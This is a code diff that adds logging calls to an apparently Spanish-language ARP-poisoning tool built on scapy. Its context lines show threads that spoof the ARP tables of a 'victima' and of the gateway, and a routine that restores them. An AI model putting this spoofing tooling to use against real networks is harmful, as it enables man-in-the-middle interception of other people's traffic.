@@ -17,6 +17,9 @@ import threading
 from scapy.all import ARP, Ether, send, sendp, srp
 import network_utils
 import ui_utils
+import venom_logger
+
+log = venom_logger.get_logger()
 
 # Control global de hilos y señal de parada
 arpspoof_processes = []
@@ -45,6 +48,11 @@ def restore_arp():
     gateway_mac = get_mac(network_utils.ip_gateway)
 
     if not victim_mac or not gateway_mac:
+        log.error(
+            "No se pudieron resolver las MAC reales antes de "
+            "restaurar (victima=%s gateway=%s).",
+            network_utils.ip_victima, network_utils.ip_gateway,
+        )
         print(ui_utils.BOLD_RED + "[✘] No se pudieron resolver las MAC reales antes de restaurar." + ui_utils.NC)
         return
 
@@ -57,6 +65,7 @@ def restore_arp():
         time.sleep(0.3)
 
     print(ui_utils.BOLD_GREEN + "[✔] Tablas ARP restauradas correctamente (o al menos intentado)." + ui_utils.NC)
+    log.info("Tablas ARP restauradas (victima y gateway).")
 
 
 # Hilo que envía paquetes ARP falsificados continuamente.
@@ -64,6 +73,7 @@ def restore_arp():
 def arpspoof_thread(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     if target_mac is None:
+        log.error("No se pudo resolver la MAC de %s.", target_ip)
         print(ui_utils.BOLD_RED + f"[✘] No se pudo resolver la MAC de {target_ip}." + ui_utils.NC)
         return
 
@@ -82,6 +92,7 @@ def spoof_objetivo():
     thread = threading.Thread(target=arpspoof_thread, args=(network_utils.ip_victima, network_utils.ip_gateway))
     thread.start()
     arpspoof_processes.append(thread)
+    log.info("Envenenamiento ARP iniciado contra la víctima.")
     print(ui_utils.BOLD_GREEN + "[✓] Tabla ARP del objetivo manipulada.\n" + ui_utils.NC)
 
 
@@ -93,4 +104,5 @@ def spoof_gateway():
     thread = threading.Thread(target=arpspoof_thread, args=(network_utils.ip_gateway, network_utils.ip_victima))
     thread.start()
     arpspoof_processes.append(thread)
+    log.info("Envenenamiento ARP iniciado contra la gateway.")
     print(ui_utils.BOLD_GREEN + "[✓] Tabla ARP de la gateway manipulada.\n" + ui_utils.NC)
